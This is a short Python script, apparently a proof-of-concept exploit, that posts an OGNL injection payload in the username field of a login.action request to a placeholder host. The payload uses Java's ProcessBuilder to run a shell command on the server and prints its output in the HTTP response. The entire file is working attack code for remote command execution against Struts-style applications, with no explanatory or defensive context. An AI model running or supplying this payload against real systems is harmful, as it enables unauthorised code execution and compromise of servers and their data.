# -*- coding: utf-8 -*-

import sys,time,requests



rr = requests.post('http://ip:8080/login.action;jsessionid=CB70E6A3351A4532977066DB7E00F58E',data={'password':'asfd','username':'%{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{"pwd"})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}'})

print(rr.text)